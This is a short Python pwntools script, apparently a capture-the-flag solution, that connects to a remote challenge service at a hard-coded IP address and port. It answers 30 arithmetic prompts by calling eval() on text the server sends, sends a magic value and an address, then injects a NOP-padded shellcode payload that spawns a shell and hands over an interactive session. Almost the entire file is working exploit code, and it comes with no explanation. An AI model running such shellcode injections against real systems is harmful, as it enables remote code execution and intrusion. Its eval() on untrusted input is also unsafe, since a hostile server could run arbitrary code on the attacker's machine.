from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
# r = process('./pwn')
r = remote("43.248.97.213", 41086)


r.send(b'\n')
r.recvuntil(b"Go!Go!Go!\n")
sleep(1)
for i in range(30):
    expr = r.recvuntil(b'=', drop=True).decode().replace('/', '//')
    ans = int(eval(expr))
    r.sendline(str(ans).encode())

sleep(3)
r.recvuntil(b'&0xffff=')
r.sendline(b'3735928559')
r.recvuntil(b'\x80\xef\xbc\x81\x0a')
# gdb.attach(r)
# pause()
r.send(p64(0x41541100))
payload = asm(shellcraft.sh()).rjust(0x200, b'\x90')
# pause()
r.send(payload)
r.interactive()
